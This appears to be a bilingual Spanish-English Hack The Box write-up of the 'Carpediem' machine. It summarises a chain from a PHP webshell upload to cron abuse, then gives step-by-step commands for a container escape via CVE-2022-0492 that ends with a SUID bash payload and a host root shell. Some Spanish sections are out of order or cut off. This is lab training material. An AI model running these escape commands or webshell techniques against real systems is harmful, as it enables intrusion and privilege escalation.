HTB hard

Resumen de Explotación

El punto de entrada fue un portal web PHP en el subdominio portal.carpediem.htb. Tras registrar una cuenta normal, descubrí que el endpoint de subida de archivos /classes/Users.php?f=upload no valida la extensión del fichero subido, lo que permitió cargar una webshell PHP y ejecutar comandos como www-data dentro de un contenedor Docker.

Desde ese contenedor enumeré la red interna Docker (172.17.0.0/24) con un binario nmap estático y establecí un túnel SOCKS con chisel para alcanzar los servicios internos. En la base de datos MongoDB del servicio Trudesk encontré access tokens de varios usuarios y, leyendo los tickets de soporte, obtuve pistas sobre credenciales VOIP de un nuevo empleado.

Usando el cliente VOIP Zoiper me conecté al sistema de telefonía interno y recuperé las credenciales de hflaccus desde un buzón de voz. Con ese usuario hice SSH al host y capturé tráfico TLS de la red Docker con tcpdump. El cifrado negociado era TLS_RSA_WITH_AES_256_CBC_SHA256, que carece de Perfect Forward Secrecy, por lo que bastó importar la clave privada del certificado de Backdrop en Wireshark para desencriptar el tráfico y extraer las credenciales de jpardella en texto claro.

Con esas credenciales accedí al panel de administración de BackdropCMS y subí un módulo ZIP malicioso con una webshell PHP, obteniendo RCE en ese contenedor como www-data. Un script cron ejecutado por root cada ~30 segundos cargaba index.php de Backdrop, del que yo era propietario, así que inyecté código PHP para obtener una reverse shell como root dentro del contenedor.

Finalmente, abusar de CVE-2022-0492 (escalada de privilegios mediante cgroups v1 release_agent) permitió escapar del contenedor y ejecutar comandos en el host. Asigné el bit SUID a una copia de bash y conseguí acceso como root en la máquina anfitriona.

Tecnologías/Exploits: PHP file upload webshell, SOCKS proxy con chisel, network discovery con nmap estático, lectura de MongoDB sin autenticación, VOIP con Zoiper, TLS traffic decryption (falta de PFS), BackdropCMS module upload RCE, cron abuse privesc, container escape via CVE-2022-0492 (cgroups release_agent).

El flujo del host hacia Backdrop es el más interesante. Al intentar hacer Follow → TCP Stream solo veo datos encriptados. Para ver si el cifrado tiene alguna vulnerabilidad, inspecciono el paquete Client Hello y la respuesta Server Hello. El cifrado negociado es:

Escalada a root en el Contenedor – Abuso de Cron

En /opt encuentro un script llamado heartbeat.sh:

#!/bin/bash
#Run a site availability check every 10 seconds via cron

checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))

if [[ $checksum != "70a121c0202a33567101e2330c069b34" ]]; then
    exit
fi

status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh \
         --root /var/www/html/backdrop https://localhost)

grep "Welcome to backdrop.carpediem.htb!" "$status"

if [[ "$?" != 0 ]]; then
    # something went wrong. restoring from backup.
    cp /root/index.php /var/www/html/backdrop/index.php
fi

El script: (1) verifica con MD5 que backdrop.sh no ha sido alterado, (2) lo ejecuta con PHP (lo que en realidad carga index.php de Backdrop), y (3) si algo falla, restaura index.php desde el backup de root. Con pspy64 confirmo que se ejecuta cada ~30 segundos como root:

Los permisos de los archivos relevantes son:

-rw-r--r-- 1 www-data www-data 578  May 10 04:55 /var/www/html/backdrop/index.php

No puedo modificar heartbeat.sh ni backdrop.sh, pero soy el propietario de index.php. Como el script de root acaba ejecutando ese index.php, puedo inyectar código PHP que se ejecutará con privilegios de root.

Escape del Contenedor – CVE-2022-0492 (cgroups release_agent)

Desde el contenedor como root no encuentro nada nuevo que no pudiera ver ya con www-data. El siguiente objetivo es escapar al host. La técnica que aplica aquí es CVE-2022-0492, una vulnerabilidad en cgroups v1 que permite escapar de contenedores.

Entendiendo el CVE-2022-0492

El archivo release_agent es una funcionalidad de cgroups v1 que permite a los administradores configurar un programa que se ejecuta cuando un proceso muere dentro de ese cgroup. Cuando ocurre esto, el kernel comprueba si notify_on_release está habilitado y, si lo está, ejecuta el binario especificado en release_agent con privilegios del kernel sobre el sistema de archivos del host.

La vulnerabilidad es que Linux no verifica que quien modifica release_agent tiene los privilegios necesarios para ejecutar código en el host. Para montar cgroupfs se necesita CAP_SYS_ADMIN, pero es posible obtenerlo dentro del contenedor mediante unshare().

Explotación paso a paso

Compruebo las capabilities actuales:

capsh --print | grep cap_sys
# CAP_SYS_ADMIN NO está presente en el set actual

Uso unshare para crear nuevos namespaces y obtener CAP_SYS_ADMIN:

unshare -UrmC bash
capsh --print | grep cap_sys_admin
# cap_sys_admin ahora aparece en el Bounding set

Monto el subsistema RDMA de cgroups:

mount -t cgroup -o rdma cgroup /mnt
ls -lah /mnt
# -rw-r--r-- 1 root root 0  notify_on_release
# -rw-r--r-- 1 root root 0  release_agent

Creo un cgroup hijo y activo notify_on_release:

mkdir /mnt/x
echo 1 > /mnt/x/notify_on_release

Obtengo la ruta del host que mapea al filesystem del contenedor:

host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo $host_path
# /var/lib/docker/overlay2/e4ee513c84a45c4dc61a80642fbbddd4fd2d1145ec759bf4415b642bc17f383b/diff

Apunto release_agent al archivo cmd que voy a crear en la raíz del contenedor (que en el host será esa ruta del overlay):

echo "$host_path/cmd" > /mnt/release_agent
cat /mnt/release_agent
# /var/lib/docker/overlay2/e4ee513c.../diff/cmd

Creo el payload: asignar el bit SUID a una copia de bash en /tmp del host:

echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/xd && chmod u+s /tmp/xd' > /cmd
chmod +x /cmd

Disparo el payload escribiendo el PID del proceso actual en cgroup.procs. El proceso muere inmediatamente, el kernel detecta que el cgroup queda vacío, y ejecuta release_agent en el contexto del host:

sh -c "echo \$\$ > /mnt/x/cgroup.procs"

El flujo lógico es el siguiente:

sh -c "echo $$ > cgroup.procs"
│
├─ $$ = PID propio del proceso
│
├─ escribe PID → kernel mueve ese PID al cgroup
│
└─ sh -c termina → PID muere
          │
          kernel: "el cgroup está vacío, notify_on_release=1"
          │
          ejecuta release_agent EN EL HOST (con privilegios de kernel)

Desde el host, con el usuario hflaccus, verifico que se ha creado la bash SUID:

ls -lah /tmp/xd
-rwsr-xr-x 1 root root 1.2M May 10 14:37 xd

La ejecuto con el flag -p para preservar el UID efectivo:

hflaccus@carpediem:~$ /tmp/xd -p
xd-5.0# whoami
root

Acceso root al host conseguido.

Exploitation Summary

The entry point was a PHP web portal at portal.carpediem.htb. The file upload endpoint /classes/Users.php?f=upload performed no extension validation, allowing a PHP webshell to be uploaded and executed as www-data inside a Docker container.

From that container, I enumerated the internal Docker network (172.17.0.0/24) using a statically compiled nmap binary and set up a SOCKS tunnel with chisel to reach internal services. In the unauthenticated MongoDB instance I found Trudesk user access tokens, and reading the support tickets revealed VOIP credentials for a new employee.

Using the Zoiper VOIP client I connected to the internal phone system and retrieved hflaccus's initial credentials from a voicemail. With those I SSH'd into the host and captured Docker network traffic with tcpdump. The negotiated cipher was TLS_RSA_WITH_AES_256_CBC_SHA256, which lacks Perfect Forward Secrecy — importing the server's private key into Wireshark was enough to decrypt the traffic and extract jpardella's credentials in plaintext.

With admin access to BackdropCMS I uploaded a malicious ZIP module containing a PHP webshell and got RCE in that container as www-data. A cron script executed by root every ~30 seconds loaded Backdrop's index.php, of which I was the owner, so I injected PHP code to get a reverse shell as container root.

Finally, CVE-2022-0492 (privilege escalation via cgroups v1 release_agent) allowed escaping the container and running commands on the host. I set the SUID bit on a bash copy in /tmp and gained root access on the host machine.

Technologies/Exploits: PHP file upload webshell, chisel SOCKS proxy, internal network discovery with static nmap, unauthenticated MongoDB, VOIP with Zoiper, TLS traffic decryption (no PFS), BackdropCMS module upload RCE, cron abuse privesc, container escape via CVE-2022-0492 (cgroups release_agent).

Container Escape – CVE-2022-0492 (cgroups release_agent)

From the container as root I find nothing new beyond what was already accessible as www-data. The next goal is escaping to the host. The applicable technique is CVE-2022-0492, a vulnerability in cgroups v1 that enables container escape.

Understanding CVE-2022-0492

The release_agent file is a cgroups v1 feature that lets administrators configure a program that runs when a process dies within that cgroup. When this happens, the kernel checks if notify_on_release is enabled and, if so, executes the binary specified in release_agent with elevated privileges against the host filesystem.

The vulnerability is that Linux does not verify that whoever modifies release_agent has those elevated privileges. Mounting cgroupfs requires CAP_SYS_ADMIN, but this can be obtained inside the container using unshare().

Step-by-Step Exploitation

Check current capabilities — CAP_SYS_ADMIN is absent:

capsh --print | grep cap_sys
# CAP_SYS_ADMIN is NOT in the current set

Use unshare to create new namespaces and gain CAP_SYS_ADMIN:

unshare -UrmC bash
capsh --print | grep cap_sys_admin
# cap_sys_admin now appears in the Bounding set

Mount the RDMA cgroup subsystem:

mount -t cgroup -o rdma cgroup /mnt
ls -lah /mnt
# -rw-r--r-- 1 root root 0  notify_on_release
# -rw-r--r-- 1 root root 0  release_agent

Create a child cgroup and enable notify_on_release:

mkdir /mnt/x
echo 1 > /mnt/x/notify_on_release

Find the host path that maps to this container's filesystem:

host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo $host_path
# /var/lib/docker/overlay2/e4ee513c84a45c4dc61a80642fbbddd4fd2d1145ec759bf4415b642bc17f383b/diff

Point release_agent to a cmd file I'll create in the container root (which maps to that overlay path on the host):

echo "$host_path/cmd" > /mnt/release_agent
cat /mnt/release_agent
# /var/lib/docker/overlay2/e4ee513c.../diff/cmd

Create the payload: set the SUID bit on a bash copy in /tmp on the host:

echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/xd && chmod u+s /tmp/xd' > /cmd
chmod +x /cmd

Trigger the payload by writing the current PID to cgroup.procs. The process dies immediately, the kernel detects the empty cgroup, and executes release_agent in the host's context:

sh -c "echo \$\$ > /mnt/x/cgroup.procs"

The execution flow:

sh -c "echo $$ > cgroup.procs"
│
├─ $$ = process's own PID
│
├─ writes PID → kernel moves that PID into the cgroup
│
└─ sh -c exits → PID dies
          │
          kernel: "cgroup is empty, notify_on_release=1"
          │
          executes release_agent ON THE HOST (with kernel privileges)

Back on the host as hflaccus, I verify the SUID bash was created:

ls -lah /tmp/xd
-rwsr-xr-x 1 root root 1.2M May 10 14:37 xd

Execute it with the -p flag to preserve the effective UID:

hflaccus@carpediem:~$ /tmp/xd -p
xd-5.0# whoami
root

Root access on the host achieved.
